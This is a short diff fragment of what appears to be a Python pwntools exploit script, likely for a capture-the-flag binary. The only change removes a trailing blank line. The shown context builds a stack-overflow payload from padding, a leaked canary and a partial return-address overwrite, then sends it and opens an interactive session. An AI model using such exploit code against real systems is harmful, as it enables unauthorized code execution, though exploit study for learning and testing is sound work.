@@ -29,4 +29,3 @@ payload = b'a'*padding1 + p64(canary) + b'a'*8 + p16(0x1330)
 
 r.send(payload)
 r.interactive()
-
